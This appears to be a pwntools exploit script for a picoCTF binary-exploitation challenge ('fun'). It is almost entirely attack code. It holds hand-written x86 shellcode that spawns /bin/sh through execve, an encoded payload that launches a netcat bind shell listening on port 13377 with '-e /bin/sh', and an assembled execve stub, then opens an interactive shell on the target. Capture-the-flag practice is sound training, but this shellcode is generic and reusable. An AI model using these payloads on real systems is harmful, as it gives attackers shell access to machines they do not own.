from pwn import *

r = process('./fun')
# r = remote('mercury.picoctf.net', 35338)
r.recvline()

raw_input()
payload = b'\x31\xC0\xB0\x0B\x31\xC9\x31\xD2\x31\xDB\xB3\x68\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xB7\x73\xB3\x2F\x53\x90\xB7\x6E\xB3\x69\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xD1\xE3\xB7\x62\xB3\x2F\x53\x90\x89\xE3\xCD\x80'

payload = b'\x31\xc0\xb0\x08\xd9\xd0\xeb\x43\x2d\x76\x70\x31\x33\x33\x37\x37\x90\x8d\x56\x04\xb0\x0c\xd9\xd0\xeb\x31\x2d\x6c\x76\x76\x65\x2f\x62\x69\x6e\x2f\x73\x68\x90\x8d\x4e\x04\xb0\x0c\xd9\xd0\xeb\x1b\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x2f\x2f\x6e\x63\x18\x8d\x5e\x04\x50\x52\x51\x53\x99\x89\xe1\xb0\x0b\xcd\x80\xd9\x74\x24\xf4\x88\x64\x06\x04\x8d\x7c\x30\x05\x31\xc0\xff\xe7'

payload = asm("""
    mov eax, 0x6e69622f
    push eax
    mov eax, 0x0068732f
    push eax
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    mov eax, 0xb
    lea ebx, DWORD PTR [esp]
    int 0x80
""")
# payload = asm("""
#     /*Put the syscall number of execve in eax*/
#     xor eax, eax
#     mov al, 0xb
    
#     /*Put zero in ecx and edx*/
#     xor ecx, ecx
#     xor edx, edx
    
#     /*Push "/sh\x00" on the stack*/
#     xor ebx, ebx
#     mov bl, 0x68
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     mov bh, 0x73
#     mov bl, 0x2f
#     push ebx
#     nop
    
#     /*Push "/bin" on the stack*/
#     mov bh, 0x6e
#     mov bl, 0x69
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     shl ebx
#     mov bh, 0x62
#     mov bl, 0x2f
#     push ebx
#     nop
              
#     /*Move the esp (that points to "/bin/sh\x00") in ebx*/
#     mov ebx, esp/*Syscall*/
#     int 0x80
# """)
r.sendline(payload)

r.interactive()